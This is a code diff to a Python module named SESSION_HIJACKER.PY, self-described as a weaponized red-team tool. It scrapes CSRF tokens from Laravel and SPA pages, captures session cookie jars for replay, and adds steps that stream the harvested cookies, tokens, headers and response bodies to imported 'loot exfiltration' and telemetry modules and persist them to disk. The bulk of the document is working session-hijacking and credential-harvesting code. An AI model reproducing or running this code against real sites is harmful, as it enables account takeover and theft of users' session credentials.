@@ -2,12 +2,17 @@
 """
 SESSION_HIJACKER.PY — Advanced Session Seeding & Token Replay (Multi-Project Edition)
 Weaponized Red-Team Module: Dynamic target resolution, multi-framework CSRF harvesting,
-and robust cookie-jar state synchronization.
+robust cookie-jar state synchronization, and centralized loot persistence.
 """
 import sys
+import json
 import httpx
 from bs4 import BeautifulSoup
 from urllib.parse import urlsplit
+
+# Import centralized framework loot exfiltration and telemetry
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 
 # Suppress insecure HTTPS warnings if self-signed certs are used in pre-production
 httpx._config.DEFAULT_CIPHERS += ":HIGH:!MEDIUM:!LOW:!NULL"
@@ -58,7 +63,6 @@ def exploit_session(target_url):
         # Parse DOM to harvest CSRF tokens across Laravel (_token) or SPA meta tags
         soup = BeautifulSoup(resp.text, "html.parser")
         
-        # Check input fields for tokens
         token_input = (
             soup.find("input", {"name": "_token"}) or 
             soup.find("input", {"name": "csrf_token"}) or
@@ -69,7 +73,6 @@ def exploit_session(target_url):
         if token_input:
             csrf_val = token_input.get("value")
         else:
-            # Fallback: Check meta tags (common in Next.js / React SPAs)
             meta_token = soup.find("meta", {"name": "csrf-token"}) or soup.find("meta", {"name": "xsrf-token"})
             if meta_token:
                 csrf_val = meta_token.get("content")
@@ -79,6 +82,25 @@ def exploit_session(target_url):
         if captured_cookies or csrf_val:
             print(f"[+] Captured Session Cookie Jar: {captured_cookies}")
             print(f"[+] Harvested Replay CSRF Token: {csrf_val if csrf_val else 'None (Stateless JWT / Header Auth)'}")
+            
+            # STREAM TELEMETRY & PERSIST HARVESTED SESSION SEED TO DISK
+            harvest_data = {
+                "base_url": base_url,
+                "cookies": captured_cookies,
+                "csrf_token": csrf_val,
+                "gateway_url": used_url
+            }
+            stream_proof("SESSION_SEED_HARVESTED", used_url, {"headers": headers}, resp.text[:300], harvest_data)
+            save_session_loot(
+                target=base_url,
+                endpoint=used_url,
+                finding_type="SESSION_SEED_HARVESTED",
+                status=resp.status_code,
+                headers=dict(resp.headers),
+                body=resp.text,
+                extra_loot=harvest_data
+            )
+
             return {
                 "base_url": base_url,
                 "cookies": captured_cookies,
